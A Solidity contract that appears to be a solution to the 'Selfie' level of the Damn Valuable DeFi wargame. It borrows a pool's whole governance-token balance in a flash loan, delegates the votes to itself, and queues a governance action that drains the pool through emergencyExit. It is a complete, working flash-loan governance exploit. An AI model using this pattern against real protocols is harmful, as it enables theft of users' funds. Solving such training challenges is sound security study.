// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {console} from "forge-std/console.sol";

contract AttackSelfie is IERC3156FlashBorrower {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    uint256 actionId;
    address recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function attackPlan() external returns (bool, uint256) {
        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "");
        return (true, actionId);
    }

    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        // this is going to be executed by the FlashLoanLender and msg.sender will also be that only in this function
        // need to vote for withdraw all tokens

        token.delegate(address(this));
        // token.transfer(address(pool), 1e18);

        bytes memory callData = abi.encodeWithSelector(SelfiePool.emergencyExit.selector, recovery);
        actionId = governance.queueAction(address(pool), 0, callData);

        token.approve(msg.sender, amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
